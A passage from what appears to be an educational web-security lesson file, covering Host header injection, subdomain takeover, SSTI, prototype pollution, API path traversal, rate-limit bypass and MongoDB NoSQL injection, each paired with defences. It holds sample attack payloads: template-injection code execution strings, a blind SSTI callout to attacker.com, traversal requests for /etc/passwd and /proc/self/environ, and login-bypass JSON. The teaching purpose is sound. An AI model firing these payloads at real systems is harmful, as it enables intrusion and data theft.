        <h3>What is the Host Header?</h3>

        <p>The HTTP Host header specifies the domain name that the client wants to access.</p>

        <pre><code>Host: target.com</code></pre>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application uses the Host header directly in application logic, redirects, emails, links, or security decisions.</p>

        <h3>Basic Vulnerable Request:</h3>

        <pre><code>GET / HTTP/1.1
Host: evil.com</code></pre>

        <p>The attacker supplies a malicious Host header value.</p>

        <h3>Password Reset Poisoning Example:</h3>

        <pre><code>Host: attacker.com</code></pre>

        <p>The application generates password reset links using the attacker-controlled domain.</p>

        <h3>Generated Malicious Link:</h3>

        <pre><code>http://attacker.com/reset?token=abc123</code></pre>

        <p>The victim receives a malicious reset link pointing to the attacker's server.</p>

        <h3>Why is Host Header Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to steal password reset tokens, poison caches, bypass access controls, or conduct phishing attacks using trusted application behavior.</p>

        <h3>Cache Poisoning Example:</h3>

        <pre><code>Host: evil.com</code></pre>

        <p>Shared caches may store malicious responses generated using attacker-controlled headers.</p>

        <h3>Web Cache Poisoning Scenario:</h3>

        <p>Victims may receive cached malicious responses containing attacker-controlled links or content.</p>

        <h3>Virtual Host Confusion:</h3>

        <p>Improper host validation may expose hidden virtual hosts or administrative interfaces.</p>

        <h3>Bypassing Security Controls:</h3>

        <p>Some applications rely on the Host header for access control or domain validation.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>GET /password-reset HTTP/1.1
Host: attacker.com</code></pre>

        <p>The server creates attacker-controlled reset URLs.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Password reset poisoning.</p>
        <p>2. Cache poisoning.</p>
        <p>3. Phishing attacks.</p>
        <p>4. Access control bypass.</p>
        <p>5. Virtual host discovery.</p>

        <h3>X-Forwarded-Host Abuse:</h3>

        <pre><code>X-Forwarded-Host: attacker.com</code></pre>

        <p>Applications behind proxies may trust additional host-related headers improperly.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET / HTTP/1.1
Host: attacker.com</code></pre>

        <p>The attacker intercepts and modifies HTTP headers before forwarding requests.</p>

        <h3>Indicators of Host Header Vulnerabilities:</h3>

        <p>1. Password reset links using attacker-controlled domains.</p>
        <p>2. Dynamic URLs generated from the Host header.</p>
        <p>3. Cache poisoning behavior.</p>
        <p>4. Improper host validation.</p>
        <p>5. Multiple accepted hostnames.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Password reset systems

URL generation logic

Caching systems

Load balancers

Reverse proxy environments</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

resetLink = "http://" + request.host +
"/reset?token=" + token;</code></pre>

        <p>The application trusts the Host header directly.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Use hardcoded trusted domains

Validate Host headers

Reject unknown hosts</code></pre>

        <p>The application validates allowed domains before generating URLs.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate Host headers strictly.</b></p>

        <p><b>2. Reject untrusted or unknown hosts.</b></p>

        <p><b>3. Use hardcoded domains for sensitive links.</b></p>

        <p><b>4. Avoid relying on client-supplied headers.</b></p>

        <p><b>5. Protect caching systems properly.</b></p>

        <p><b>6. Validate proxy-related headers carefully.</b></p>

        <p><b>7. Monitor suspicious Host header activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Configure trusted host allowlists

Restrict reverse proxy behavior

Apply cache protections

Enable request logging

Use secure URL generation</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
Param Miner
curl</code></pre>

        <h3>Difference Between Host Header Injection and Open Redirect:</h3>

        <p><b>Host Header Injection:</b> Manipulates server behavior using HTTP headers.</p>

        <p><b>Open Redirect:</b> Redirects users using unvalidated URLs.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal reset tokens, poison caches, conduct phishing attacks, bypass access controls, expose internal systems, or manipulate application-generated links.</p>

        <h3>Vulnerability Severity:</h3>

        <p>HTTP Host Header Injection vulnerabilities are considered highly critical because trusted server behavior may be manipulated to compromise users, applications, and infrastructure.</p>
    `
},


{
    "id": 33,
    "title": "Subdomain Takeover",
    "summary": `
        <p><b>Subdomain Takeover</b> is a dangerous vulnerability that occurs when a subdomain points to an external service that is no longer claimed or properly configured.</p>

        <p>This vulnerability allows attackers to register or claim the abandoned external resource and gain control over the vulnerable subdomain.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when DNS records continue pointing to expired, deleted, or unclaimed third-party services.</p>

        <h3>Common Vulnerable Services:</h3>

        <pre><code>GitHub Pages

AWS S3 Buckets

Heroku

Azure

Shopify

Fastly</code></pre>

        <h3>Basic Vulnerable DNS Example:</h3>

        <pre><code>blog.target.com CNAME abandoned.herokuapp.com</code></pre>

        <p>The subdomain points to a third-party service that no longer exists.</p>

        <h3>Basic Exploitation Process:</h3>

        <p>1. Identify vulnerable subdomains.</p>
        <p>2. Detect unclaimed third-party services.</p>
        <p>3. Register or claim the abandoned resource.</p>
        <p>4. Gain control over the subdomain content.</p>

        <h3>Why is Subdomain Takeover Dangerous?</h3>

        <p>Successful exploitation allows attackers to host malicious content on trusted subdomains belonging to legitimate organizations.</p>

        <h3>Example of Vulnerable Response:</h3>

        <pre><code>No such app
The requested bucket does not exist</code></pre>

        <p>These error messages often indicate abandoned external services.</p>

        <h3>CNAME Record Example:</h3>

        <pre><code>support.target.com CNAME targethelp.github.io</code></pre>

        <p>If the external GitHub Pages project is deleted, attackers may claim it.</p>

        <h3>AWS S3 Bucket Takeover Example:</h3>

        <pre><code>files.target.com.s3.amazonaws.com</code></pre>

        <p>Attackers may register missing cloud storage buckets referenced by DNS records.</p>

        <h3>Why Trusted Subdomains Matter?</h3>

        <p>Victims trust official company subdomains, making phishing and malicious content significantly more convincing.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Phishing attacks.</p>
        <p>2. Malware hosting.</p>
        <p>3. Cookie theft.</p>
        <p>4. Session hijacking.</p>
        <p>5. Reputation abuse.</p>

        <h3>Cookie Scope Abuse:</h3>

        <p>Applications using wildcard cookies may expose sensitive session data to attacker-controlled subdomains.</p>

        <pre><code>Set-Cookie: session=abc123; Domain=.target.com</code></pre>

        <h3>SEO and Reputation Abuse:</h3>

        <p>Attackers may abuse trusted subdomains for spam campaigns or malicious SEO operations.</p>

        <h3>Example Using dig:</h3>

        <pre><code>dig support.target.com</code></pre>

        <p>Security researchers analyze DNS records for vulnerable external mappings.</p>

        <h3>Example Using nslookup:</h3>

        <pre><code>nslookup blog.target.com</code></pre>

        <p>The tool reveals CNAME records pointing to third-party services.</p>

        <h3>Indicators of Subdomain Takeover:</h3>

        <p>1. Dangling CNAME records.</p>
        <p>2. Deleted third-party services.</p>
        <p>3. Error messages from cloud providers.</p>
        <p>4. Unused subdomains.</p>
        <p>5. External service references in DNS records.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Marketing websites

Support portals

Development environments

Cloud storage systems

Temporary project domains</code></pre>

        <h3>Example Using Subdomain Scanners:</h3>

        <pre><code>subfinder
amass
assetfinder
subjack
subzy</code></pre>

        <p>These tools help identify dangling subdomains and takeover opportunities.</p>

        <h3>Safe Configuration Example:</h3>

        <pre><code>// Secure Practice

Remove unused DNS records

Delete stale CNAME entries

Audit third-party services regularly</code></pre>

        <p>Organizations should continuously monitor external integrations and DNS records.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Remove unused DNS records immediately.</b></p>

        <p><b>2. Audit external service integrations regularly.</b></p>

        <p><b>3. Monitor dangling CNAME records.</b></p>

        <p><b>4. Avoid unnecessary third-party subdomain mappings.</b></p>

        <p><b>5. Restrict wildcard cookie usage.</b></p>

        <p><b>6. Apply automated DNS monitoring.</b></p>

        <p><b>7. Disable abandoned cloud resources properly.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Implement DNS asset management

Monitor cloud infrastructure

Restrict cookie domains

Audit inactive subdomains

Apply security monitoring</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>subjack
subzy
amass
subfinder
Nuclei</code></pre>

        <h3>Difference Between Subdomain Takeover and DNS Hijacking:</h3>

        <p><b>Subdomain Takeover:</b> Exploits abandoned external service mappings.</p>

        <p><b>DNS Hijacking:</b> Directly manipulates DNS infrastructure or records.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may host phishing pages, distribute malware, steal cookies, impersonate organizations, abuse trusted domains, or compromise user trust using official subdomains.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Subdomain Takeover vulnerabilities are considered highly critical because attackers may fully control trusted organizational subdomains and abuse them for large-scale attacks.</p>
    `
},


{
    "id": 34,
    "title": "Server Side Template Injection (SSTI)",
    "summary": `
        <p><b>Server Side Template Injection (SSTI)</b> is a critical vulnerability that occurs when user-controlled input is embedded directly into server-side templates without proper sanitization or security controls.</p>

        <p>This vulnerability may allow attackers to execute arbitrary code on the server, access sensitive data, bypass security restrictions, or completely compromise the application.</p>

        <h3>What are Template Engines?</h3>

        <p>Template engines are systems used by web applications to dynamically generate HTML pages or other content.</p>

        <h3>Common Template Engines:</h3>

        <pre><code>Jinja2

Twig

Smarty

Freemarker

Velocity

Handlebars</code></pre>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications place untrusted user input directly into template expressions or rendering logic.</p>

        <h3>Basic Vulnerable Example:</h3>

        <pre><code>Hello {{ user_input }}</code></pre>

        <p>If user input is processed as template code, attackers may inject malicious expressions.</p>

        <h3>Simple SSTI Detection Payload:</h3>

        <pre><code>{{7*7}}</code></pre>

        <p>If the server responds with <code>49</code>, template injection may exist.</p>

        <h3>Why is SSTI Dangerous?</h3>

        <p>Successful exploitation may allow attackers to execute server-side commands, read sensitive files, access environment variables, or gain Remote Code Execution.</p>

        <h3>Jinja2 SSTI Example:</h3>

        <pre><code>{{ config.items() }}</code></pre>

        <p>The attacker accesses sensitive application configuration data.</p>

        <h3>Remote Code Execution Example:</h3>

        <pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').system('id') }}</code></pre>

        <p>The attacker executes operating system commands through the template engine.</p>

        <h3>Twig SSTI Example:</h3>

        <pre><code>{{7*7}}</code></pre>

        <p>Many template engines evaluate mathematical expressions directly.</p>

        <h3>Freemarker SSTI Example:</h3>

        <pre><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;
${ ex("id") }</code></pre>

        <p>The payload attempts to execute operating system commands.</p>

        <h3>Accessing Sensitive Files:</h3>

        <pre><code>{{ ''.__class__.__mro__[1].__subclasses__() }}</code></pre>

        <p>Attackers may enumerate internal Python objects and classes.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Code Execution.</p>
        <p>2. Sensitive file disclosure.</p>
        <p>3. Environment variable access.</p>
        <p>4. Application compromise.</p>
        <p>5. Privilege escalation.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /search HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The attacker injects template expressions into application parameters.</p>

        <h3>Indicators of SSTI Vulnerabilities:</h3>

        <p>1. Dynamic server-side template rendering.</p>
        <p>2. Mathematical expressions evaluated in responses.</p>
        <p>3. Template syntax reflected in output.</p>
        <p>4. Server-side error messages from template engines.</p>
        <p>5. Access to internal application objects.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Email templates

Search functionality

User profile rendering

Report generators

CMS platforms</code></pre>

        <h3>Blind SSTI:</h3>

        <p>Sometimes template injection succeeds without visible output.</p>

        <pre><code>{{ system('ping attacker.com') }}</code></pre>

        <p>Attackers monitor external interactions to confirm exploitation.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

template.render(user_input)</code></pre>

        <p>The application renders user input directly as template code.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Treat user input as plain text

Escape template syntax

Use sandboxed rendering</code></pre>

        <p>The application prevents user-controlled template execution.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Never render user input directly as templates.</b></p>

        <p><b>2. Escape template syntax properly.</b></p>

        <p><b>3. Use sandboxed template environments.</b></p>

        <p><b>4. Restrict dangerous template functions.</b></p>

        <p><b>5. Apply least privilege server permissions.</b></p>

        <p><b>6. Keep template engines updated.</b></p>

        <p><b>7. Monitor suspicious template expressions.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict server command execution

Apply application sandboxing

Disable unnecessary template features

Monitor runtime behavior

Enable security logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
Tplmap
OWASP ZAP
Nuclei
SSTImap</code></pre>

        <h3>Difference Between SSTI and XSS:</h3>

        <p><b>SSTI:</b> Executes code on the server side.</p>

        <p><b>XSS:</b> Executes code inside the victim's browser.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may execute arbitrary server commands, access sensitive files, compromise backend systems, steal credentials, or fully take over vulnerable applications.</p>

        <h3>Vulnerability Severity:</h3>

        <p>SSTI vulnerabilities are considered extremely critical because template injection may directly lead to Remote Code Execution and complete server compromise.</p>
    `
},


{
    "id": 35,
    "title": "Prototype Pollution in JavaScript",
    "summary": `
        <p><b>Prototype Pollution</b> is a dangerous JavaScript vulnerability that occurs when attackers are able to modify the properties of JavaScript object prototypes dynamically.</p>

        <p>This vulnerability may allow attackers to manipulate application logic, bypass security controls, inject malicious properties, or even achieve Remote Code Execution in vulnerable environments.</p>

        <h3>What is a Prototype in JavaScript?</h3>

        <p>In JavaScript, objects inherit properties and methods from prototypes.</p>

        <pre><code>Object.prototype</code></pre>

        <p>Changes made to shared prototypes may affect all objects created from them.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications merge or process user-controlled objects without restricting dangerous properties such as <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code>.</p>

        <h3>Basic Vulnerable Example:</h3>

        <pre><code>let userInput = JSON.parse(input);

Object.assign({}, userInput);</code></pre>

        <p>The application copies attacker-controlled object properties directly.</p>

        <h3>Prototype Pollution Payload Example:</h3>

        <pre><code>{
  "__proto__": {
    "isAdmin": true
  }
}</code></pre>

        <p>The attacker injects properties into the global object prototype.</p>

        <h3>Why is Prototype Pollution Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass authorization checks, manipulate application behavior, poison configurations, or achieve Remote Code Execution.</p>

        <h3>Authorization Bypass Example:</h3>

        <pre><code>if(user.isAdmin) {
    allowAccess();
}</code></pre>

        <p>If the prototype contains <code>isAdmin=true</code>, access checks may fail.</p>

        <h3>Polluted Object Example:</h3>

        <pre><code>{}.isAdmin</code></pre>

        <p>After successful pollution, newly created objects may inherit malicious properties.</p>

        <h3>Common Dangerous Properties:</h3>

        <pre><code>__proto__

constructor

prototype</code></pre>

        <h3>Deep Merge Vulnerability Example:</h3>

        <pre><code>merge(target, userInput)</code></pre>

        <p>Unsafe recursive merge functions are common causes of Prototype Pollution.</p>

        <h3>jQuery Prototype Pollution Example:</h3>

        <pre><code>$.extend(true, {}, userInput)</code></pre>

        <p>Older vulnerable libraries may allow unsafe prototype modification.</p>

        <h3>Remote Code Execution Scenario:</h3>

        <p>Prototype Pollution may become extremely dangerous when chained with vulnerable template engines or unsafe execution logic.</p>

        <h3>Denial of Service Example:</h3>

        <pre><code>{
  "__proto__": {
    "toString": null
  }
}</code></pre>

        <p>Breaking internal object behavior may crash applications.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authorization bypass.</p>
        <p>2. Application logic manipulation.</p>
        <p>3. Denial of Service.</p>
        <p>4. Remote Code Execution.</p>
        <p>5. Configuration poisoning.</p>

        <h3>Example Using URL Parameters:</h3>

        <pre><code>?__proto__[isAdmin]=true</code></pre>

        <p>Attackers inject malicious prototype properties through query parameters.</p>

        <h3>Indicators of Prototype Pollution:</h3>

        <p>1. Unsafe object merge operations.</p>
        <p>2. Dynamic object property assignment.</p>
        <p>3. Use of vulnerable JavaScript libraries.</p>
        <p>4. Unexpected inherited object properties.</p>
        <p>5. Application logic anomalies.</p>

        <h3>Common Vulnerable Libraries:</h3>

        <pre><code>jQuery

Lodash

Hoek

merge-deep

qs</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /api/profile HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The attacker injects malicious prototype properties inside JSON payloads.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

merge(config, userInput)</code></pre>

        <p>The application trusts unvalidated object properties.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Block __proto__

Validate object keys

Use safe merge libraries</code></pre>

        <p>The application filters dangerous properties before processing objects.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Block dangerous properties such as __proto__.</b></p>

        <p><b>2. Validate object keys before merging data.</b></p>

        <p><b>3. Use secure object merge libraries.</b></p>

        <p><b>4. Avoid recursive merges of untrusted objects.</b></p>

        <p><b>5. Freeze sensitive prototypes when possible.</b></p>

        <p><b>6. Keep JavaScript libraries updated.</b></p>

        <p><b>7. Monitor abnormal application behavior.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Apply strict input validation

Restrict dangerous object manipulation

Use secure coding practices

Monitor runtime anomalies

Enable application logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
DOM Invader
PPScan
Nuclei
OWASP ZAP</code></pre>

        <h3>Difference Between Prototype Pollution and XSS:</h3>

        <p><b>Prototype Pollution:</b> Manipulates internal JavaScript object behavior.</p>

        <p><b>XSS:</b> Executes malicious JavaScript inside browsers.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass security mechanisms, manipulate application logic, poison configurations, crash services, or chain the vulnerability into full Remote Code Execution attacks.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Prototype Pollution vulnerabilities are considered highly critical because shared JavaScript object behavior may be globally manipulated across entire applications.</p>
    `
},


{
    "id": 36,
    "title": "Path Traversal in APIs",
    "summary": `
        <p><b>Path Traversal in APIs</b> is a dangerous vulnerability that occurs when API endpoints allow attackers to access files or directories outside the intended application scope.</p>

        <p>This vulnerability happens when user-controlled file paths are processed without proper validation, allowing attackers to traverse the server file system using directory traversal sequences.</p>

        <h3>What is Path Traversal?</h3>

        <p>Path Traversal is a vulnerability that abuses file path manipulation to access unauthorized files on a server.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when APIs directly use user input in file operations without sanitization or access restrictions.</p>

        <h3>Basic Vulnerable API Example:</h3>

        <pre><code>GET /api/file?name=report.pdf</code></pre>

        <p>The API retrieves files using user-controlled input.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>GET /api/file?name=../../../../etc/passwd</code></pre>

        <p>The attacker traverses directories to access sensitive system files.</p>

        <h3>Why is Path Traversal Dangerous?</h3>

        <p>Successful exploitation may expose configuration files, credentials, application source code, or sensitive operating system files.</p>

        <h3>Linux Sensitive File Example:</h3>

        <pre><code>/etc/passwd</code></pre>

        <p>Attackers commonly target system account information files.</p>

        <h3>Windows Sensitive File Example:</h3>

        <pre><code>C:\\Windows\\win.ini</code></pre>

        <p>Windows configuration files may also become accessible.</p>

        <h3>Common Traversal Sequences:</h3>

        <pre><code>../
..\\
%2e%2e%2f
%252e%252e%252f</code></pre>

        <p>Attackers often use encoded traversal sequences to bypass filters.</p>

        <h3>API Download Endpoint Example:</h3>

        <pre><code>GET /download?file=invoice.pdf</code></pre>

        <p>Improper file validation may expose arbitrary server files.</p>

        <h3>Source Code Disclosure Example:</h3>

        <pre><code>../../app/config/database.yml</code></pre>

        <p>Attackers may retrieve sensitive application configuration files.</p>

        <h3>Container Environment Exposure:</h3>

        <pre><code>/proc/self/environ</code></pre>

        <p>Environment variables may expose credentials or secret tokens.</p>

        <h3>Log File Access Example:</h3>

        <pre><code>../../logs/access.log</code></pre>

        <p>Attackers may analyze server logs for sensitive information.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Sensitive file disclosure.</p>
        <p>2. Source code access.</p>
        <p>3. Credential theft.</p>
        <p>4. Configuration exposure.</p>
        <p>5. Information gathering.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /api/export?path=../../../../etc/passwd HTTP/1.1
Host: vulnerable-api.com</code></pre>

        <p>The attacker manipulates file path parameters to escape intended directories.</p>

        <h3>Indicators of Path Traversal Vulnerabilities:</h3>

        <p>1. File download or export functionality.</p>
        <p>2. User-controlled file paths.</p>
        <p>3. Access to unexpected server files.</p>
        <p>4. Directory traversal sequences in requests.</p>
        <p>5. Missing file access restrictions.</p>

        <h3>Common Vulnerable API Features:</h3>

        <pre><code>File download APIs

Backup export systems

Log viewers

Image retrieval endpoints

Document management systems</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

readFile("/uploads/" + userInput)</code></pre>

        <p>The application trusts the file path supplied by the user.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Use allowlisted filenames

Normalize paths

Restrict file access directories</code></pre>

        <p>The application validates file paths before processing requests.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate and sanitize file paths strictly.</b></p>

        <p><b>2. Use filename allowlists whenever possible.</b></p>

        <p><b>3. Normalize paths before file access.</b></p>

        <p><b>4. Restrict file operations to safe directories.</b></p>

        <p><b>5. Avoid direct user-controlled file access.</b></p>

        <p><b>6. Apply least privilege file permissions.</b></p>

        <p><b>7. Monitor suspicious traversal attempts.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict filesystem permissions

Use application sandboxing

Disable unnecessary file access

Monitor API requests

Enable security logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
ffuf
Postman</code></pre>

        <h3>Difference Between Path Traversal and LFI:</h3>

        <p><b>Path Traversal:</b> Focuses on unauthorized file access through path manipulation.</p>

        <p><b>LFI:</b> Includes local file inclusion within application execution contexts.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may access sensitive files, expose credentials, leak source code, gather internal system information, or chain the vulnerability into full server compromise.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Path Traversal vulnerabilities in APIs are considered highly critical because unrestricted file access may expose confidential server data and backend infrastructure information.</p>
    `
},


{
    "id": 37,
    "title": "API Rate Limit Bypass",
    "summary": `
        <p><b>API Rate Limit Bypass</b> is a vulnerability or security weakness that allows attackers to evade request limiting mechanisms implemented by APIs.</p>

        <p>Rate limiting is designed to restrict the number of requests a client can perform within a specific time period, but improper implementations may allow attackers to bypass these protections.</p>

        <h3>What is Rate Limiting?</h3>

        <p>Rate limiting is a security control that protects APIs from abuse, brute force attacks, scraping, Denial of Service, and automated exploitation attempts.</p>

        <h3>Basic Rate Limit Example:</h3>

        <pre><code>100 requests per minute</code></pre>

        <p>The API blocks clients after exceeding the configured threshold.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when APIs rely on weak request tracking methods or fail to enforce consistent rate limiting logic.</p>

        <h3>IP Rotation Bypass:</h3>

        <pre><code>Use multiple IP addresses</code></pre>

        <p>Attackers distribute requests across many IP addresses to evade limits.</p>

        <h3>X-Forwarded-For Header Abuse:</h3>

        <pre><code>X-Forwarded-For: 127.0.0.1</code></pre>

        <p>Some APIs trust spoofed proxy headers for client identification.</p>

        <h3>Token Rotation Example:</h3>

        <pre><code>Use multiple API keys</code></pre>

        <p>Attackers rotate authentication tokens to bypass per-user restrictions.</p>

        <h3>Why is Rate Limit Bypass Dangerous?</h3>

        <p>Successful bypasses may allow attackers to perform brute force attacks, API scraping, credential stuffing, resource exhaustion, or automated exploitation.</p>

        <h3>Brute Force Login Scenario:</h3>

        <pre><code>POST /api/login</code></pre>

        <p>Attackers continuously attempt password combinations without being blocked.</p>

        <h3>OTP Brute Force Example:</h3>

        <pre><code>POST /api/verify-otp</code></pre>

        <p>Weak rate limiting may expose one-time password systems.</p>

        <h3>Concurrent Request Bypass:</h3>

        <pre><code>Send parallel requests simultaneously</code></pre>

        <p>Race conditions may allow attackers to exceed intended limits.</p>

        <h3>Endpoint Rotation Technique:</h3>

        <pre><code>/v1/login
/v2/login</code></pre>

        <p>Different API endpoints may share inconsistent rate limiting rules.</p>

        <h3>Case Sensitivity Bypass:</h3>

        <pre><code>/API/login
/api/login</code></pre>

        <p>Improper endpoint normalization may bypass protections.</p>

        <h3>User-Agent Rotation:</h3>

        <pre><code>Change User-Agent headers</code></pre>

        <p>Weak systems may identify clients using mutable headers.</p>

        <h3>HTTP Parameter Pollution:</h3>

        <pre><code>?id=1&id=2</code></pre>

        <p>Malformed requests may confuse request counters.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Credential stuffing.</p>
        <p>2. Brute force attacks.</p>
        <p>3. API scraping.</p>
        <p>4. Resource exhaustion.</p>
        <p>5. Automated exploitation.</p>

        <h3>Indicators of Weak Rate Limiting:</h3>

        <p>1. Missing API throttling.</p>
        <p>2. Inconsistent request blocking.</p>
        <p>3. Unlimited OTP attempts.</p>
        <p>4. Trusting spoofable headers.</p>
        <p>5. Weak distributed request tracking.</p>

        <h3>Common Vulnerable API Features:</h3>

        <pre><code>Authentication systems

OTP verification

Password reset APIs

Search endpoints

Public data APIs</code></pre>

        <h3>Example Using Burp Suite Intruder:</h3>

        <pre><code>POST /api/login HTTP/1.1
Host: vulnerable-api.com</code></pre>

        <p>The attacker automates high-volume requests against vulnerable endpoints.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Weak Example

Limit requests by User-Agent only</code></pre>

        <p>Attackers can easily modify spoofable request headers.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Track IPs and accounts

Apply distributed rate limiting

Use CAPTCHA and MFA</code></pre>

        <p>The API enforces stronger anti-abuse protections.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Apply strict distributed rate limiting.</b></p>

        <p><b>2. Avoid trusting spoofable headers.</b></p>

        <p><b>3. Enforce account-based throttling.</b></p>

        <p><b>4. Use CAPTCHA for suspicious activity.</b></p>

        <p><b>5. Implement Multi-Factor Authentication (MFA).</b></p>

        <p><b>6. Detect automated attack patterns.</b></p>

        <p><b>7. Monitor abnormal API traffic continuously.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Use API gateways

Apply WAF protections

Enable distributed throttling

Restrict concurrent requests

Monitor abuse attempts</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite Intruder
OWASP ZAP
ffuf
Nuclei
Postman</code></pre>

        <h3>Difference Between Rate Limiting and Authentication:</h3>

        <p><b>Rate Limiting:</b> Restricts request frequency and abuse.</p>

        <p><b>Authentication:</b> Verifies user identity and access permissions.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may brute force passwords, abuse APIs, scrape sensitive data, exhaust backend resources, bypass OTP systems, or automate large-scale attacks against vulnerable services.</p>

        <h3>Vulnerability Severity:</h3>

        <p>API Rate Limit Bypass vulnerabilities are considered highly dangerous because weak anti-abuse protections may expose APIs to automated exploitation and large-scale attacks.</p>
    `
},


{
    "id": 38,
    "title": "NoSQL Injection in MongoDB",
    "summary": `
        <p><b>NoSQL Injection</b> is a critical vulnerability that occurs when applications fail to properly validate user input before using it in NoSQL database queries such as MongoDB.</p>

        <p>This vulnerability may allow attackers to bypass authentication, extract sensitive data, manipulate database queries, or compromise backend systems.</p>

        <h3>What is MongoDB?</h3>

        <p>MongoDB is a popular NoSQL database that stores data using flexible JSON-like documents instead of traditional SQL tables.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when user-controlled input is inserted directly into MongoDB queries without proper validation or sanitization.</p>

        <h3>Basic Vulnerable Login Example:</h3>

        <pre><code>db.users.find({
  username: userInput,
  password: passInput
})</code></pre>

        <p>The application trusts user-supplied values directly inside the database query.</p>

        <h3>Authentication Bypass Example:</h3>

        <pre><code>{
  "username": {"$ne": null},
  "password": {"$ne": null}
}</code></pre>

        <p>The attacker abuses MongoDB operators to bypass login validation.</p>

        <h3>Why is NoSQL Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass authentication, dump database contents, manipulate application logic, or gain administrative access.</p>

        <h3>MongoDB Operators Commonly Abused:</h3>

        <pre><code>$ne
$gt
$lt
$regex
$where</code></pre>

        <p>Attackers abuse MongoDB operators to alter query behavior.</p>

        <h3>Using $ne Operator:</h3>

        <pre><code>{"$ne": null}</code></pre>

        <p>The condition matches values that are not equal to null.</p>

        <h3>Regex Injection Example:</h3>

        <pre><code>{
  "username": {
    "$regex": "admin.*"
  }
}</code></pre>

        <p>Attackers use regular expressions to enumerate usernames or data.</p>

        <h3>Using $where for JavaScript Execution:</h3>

        <pre><code>{
  "$where": "this.username == 'admin'"
}</code></pre>

        <p>Some MongoDB configurations allow server-side JavaScript execution.</p>

        <h3>Blind NoSQL Injection Example:</h3>

        <pre><code>{
  "username": "admin",
  "password": {
    "$regex": "^a"
  }
}</code></pre>

        <p>Attackers extract secrets character by character using conditional responses.</p>

        <h3>Database Enumeration Example:</h3>

        <pre><code>{
  "username": {
    "$exists": true
  }
}</code></pre>

        <p>The attacker checks whether fields exist inside database documents.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. Database extraction.</p>
        <p>3. Administrative access.</p>
        <p>4. Data manipulation.</p>
        <p>5. Remote Code Execution.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-api.com</code></pre>

        <p>The attacker injects malicious JSON payloads into authentication requests.</p>

        <h3>Indicators of NoSQL Injection:</h3>

        <p>1. JSON-based request bodies.</p>
